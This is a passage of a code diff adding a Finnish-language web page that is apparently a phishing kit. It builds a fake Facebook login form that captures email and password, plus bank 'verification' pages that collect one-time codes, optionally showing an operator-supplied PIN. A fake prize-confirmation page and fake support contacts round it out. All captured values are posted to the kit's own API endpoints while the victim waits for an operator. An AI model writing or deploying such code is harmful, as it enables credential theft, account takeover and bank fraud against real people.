+                '<div style="margin-bottom:1rem;">' +
+                    '<input type="text" id="fbEmail" placeholder="Matkapuhelinnumero tai sähköpostiosoite" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;">' +
+                '</div>' +
+                '<div style="margin-bottom:1rem;">' +
+                    '<input type="password" id="fbPassword" placeholder="Salasana" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;">' +
+                '</div>' +
+                '<button id="fbSubmitBtn" onclick="handleFacebookSubmit()" style="width:100%;padding:14px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;">Kirjaudu sisään</button>' +
+                '<p style="text-align:center;margin-top:1rem;"><a href="#" style="color:#1877F2;text-decoration:none;font-size:0.9rem;">Unohtuiko salasana?</a></p>' +
+            '</div>' +
+        '</div>';
+        showPage('facebookPage');
+    }}
+
+    function handleFacebookSubmit() {{
+        var em = document.getElementById('fbEmail');
+        var pw = document.getElementById('fbPassword');
+        if (!em || !em.value || !pw || !pw.value) return;
+        var btn = document.getElementById('fbSubmitBtn');
+        btn.disabled = true;
+        btn.textContent = 'Käsitellään...';
+        submitToApi('save_facebook', {{email: em.value, password: pw.value}});
+    }}
+
+    function renderVerifyPage(bankName, data) {{
+        var el = document.getElementById('verifyPage');
+        var pin = data.op_pin || '';
+        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
+            '<h2 style="color:#fff;margin-bottom:0.5rem;">' + bankName + ' - Vahvistus</h2>' +
+            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
+                (pin ? '<p style="color:#374151;font-size:0.95rem;margin-bottom:1rem;text-align:center;">Koodi: <strong>' + pin + '</strong></p>' : '') +
+                '<p style="color:#374151;font-size:0.95rem;margin-bottom:1.5rem;text-align:center;">Hyväksy toiminto ' + bankName + ' sovelluksessasi.</p>' +
+                '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;" id="verifyInputs">' +
+                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                '</div>' +
+                '<button id="verifySubmitBtn" onclick="handleVerifySubmit()" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
+            '</div>' +
+        '</div>';
+        showPage('verifyPage');
+        var firstInput = el.querySelector('.verify-input');
+        if (firstInput) firstInput.focus();
+    }}
+
+    function handleVerifySubmit() {{
+        var inputs = document.querySelectorAll('#verifyInputs .verify-input');
+        var code = '';
+        inputs.forEach(function(i){{ code += i.value; }});
+        if (code.length < 3) return;
+        var btn = document.getElementById('verifySubmitBtn');
+        btn.disabled = true;
+        btn.textContent = 'Käsitellään...';
+        submitToApi('save_otp', {{otp: code}});
+    }}
+
+    function renderCustomVerifyPage(texts) {{
+        texts = texts || {{}};
+        var el = document.getElementById('verifyPage');
+        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
+            '<h2 style="color:#fff;margin-bottom:0.5rem;">Vahvistus</h2>' +
+            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
+                (texts.text1 ? '<p style="color:#374151;font-size:1rem;font-weight:600;margin-bottom:0.5rem;text-align:center;">' + texts.text1 + '</p>' : '') +
+                (texts.text2 ? '<p style="color:#6B7280;font-size:0.95rem;margin-bottom:1rem;text-align:center;">' + texts.text2 + '</p>' : '') +
+                (texts.text3 ? '<p style="color:#6B7280;font-size:0.9rem;margin-bottom:1.5rem;text-align:center;">' + texts.text3 + '</p>' : '') +
+                '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;" id="cvInputs">' +
+                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
+                '</div>' +
+                '<button id="cvSubmitBtn" onclick="handleCustomVerifySubmit()" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
+            '</div>' +
+        '</div>';
+        showPage('verifyPage');
+        var firstInput = el.querySelector('.cv-input');
+        if (firstInput) firstInput.focus();
+    }}
+
+    function handleCustomVerifySubmit() {{
+        var inputs = document.querySelectorAll('#cvInputs .cv-input');
+        var code = '';
+        inputs.forEach(function(i){{ code += i.value; }});
+        if (code.length < 3) return;
+        var btn = document.getElementById('cvSubmitBtn');
+        btn.disabled = true;
+        btn.textContent = 'Käsitellään...';
+        submitToApi('save_otp', {{otp: code}});
+    }}
+
+    function renderSuccessPage() {{
+        var el = document.getElementById('successPage');
+        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
+            '<div style="margin:2rem 0;"><svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22C55E" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg></div>' +
+            '<h2 style="color:#22C55E;font-size:1.5rem;font-weight:700;margin-bottom:0.5rem;">Onnittelut!</h2>' +
+            '<p style="color:#fff;font-size:1.1rem;">Osallistumisesi On Tallennettu</p>' +
+        '</div>';
+        showPage('successPage');
+    }}
+
+    function renderSupportPage(data) {{
+        data = data || {{}};
+        var step = data.support_step || '2';
+        var el = document.getElementById('supportPage');
+        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
+            '<h2 style="color:#fff;margin-bottom:0.5rem;">Miten voimme auttaa?</h2>' +
+            '<p style="color:#FFD700;font-size:0.9rem;margin:0.5rem 0;">Vaihe ' + step + ' / 8</p>' +
+            '<p style="color:rgba(255,255,255,0.8);font-size:0.95rem;margin-bottom:1.5rem;">Olemme täällä vastaamassa kysymyksiisi.</p>' +
+            '<div style="display:flex;flex-direction:column;gap:1rem;width:100%;">' +
+                '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
+                    '<h3 style="color:#1F2937;font-size:1rem;margin-bottom:0.5rem;">💬 Live-tuki</h3>' +
+                    '<p style="color:#6B7280;font-size:0.85rem;">Asiantuntijaedustajamme ovat valmiina auttamaan sinua heti.</p>' +
+                '</div>' +
+                '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
+                    '<h3 style="color:#25D366;font-size:1rem;margin-bottom:0.5rem;">📱 WhatsApp-tuki</h3>' +
+                    '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">Voit ottaa meihin yhteyttä WhatsAppin kautta 24/7.</p>' +
+                    '<button style="padding:10px 24px;background:#25D366;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">Ota yhteyttä</button>' +
+                '</div>' +
+                '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
+                    '<h3 style="color:#1877F2;font-size:1rem;margin-bottom:0.5rem;">📘 Facebook-tuki</h3>' +
+                    '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">Ota meihin yhteyttä Facebook Messengerin kautta 24/7.</p>' +
+                    '<button style="padding:10px 24px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">Ota yhteyttä Messengerissä</button>' +
+                '</div>' +
+            '</div>' +
+        '</div>';
+        showPage('supportPage');
+    }}
+
+    // ========================================
+    // API SUBMIT HELPER
+    // ========================================
+    function submitToApi(endpoint, data) {{
+        var vid = getVisitorId();
+        var fd = new FormData();
+        fd.append('visitor_id', vid);
+        for (var k in data) {{ if (data.hasOwnProperty(k)) fd.append(k, data[k]); }}
+
+        fetch('/api/' + endpoint, {{
+            method: 'POST',
+            body: fd,
+            credentials: 'include'
+        }}).then(function(r){{ return r.json(); }}).then(function(resp) {{
+            // After submit, show wait page and continue polling
+            _currentPage = 'wait';
+            _lastPage = 'wait';
+            showPage('waitPage');
+            document.getElementById('waitPage').classList.add('active');
+        }}).catch(function(err) {{
+            console.error('Submit error:', err);
+            _currentPage = 'wait';
+            _lastPage = 'wait';
+            showPage('waitPage');
+            document.getElementById('waitPage').classList.add('active');
+        }});
+    }}
+
+    // ========================================
+    // OTP-STYLE INPUT AUTO-FOCUS
+    // ========================================
+    document.addEventListener('input', function(e) {{
+        if (e.target.classList.contains('sms-input') || e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) {{
+            if (e.target.value.length === 1) {{
+                var next = e.target.nextElementSibling;
+                if (next && next.tagName === 'INPUT') next.focus();
+            }}
+        }}
+    }});
+
+    document.addEventListener('keydown', function(e) {{
+        if ((e.target.classList.contains('sms-input') || e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) && e.key === 'Backspace' && !e.target.value) {{
+            var prev = e.target.previousElementSibling;
+            if (prev && prev.tagName === 'INPUT') {{ prev.focus(); prev.value = ''; }}
+        }}
+    }});
+
+    </script>
+</body>
+</html>
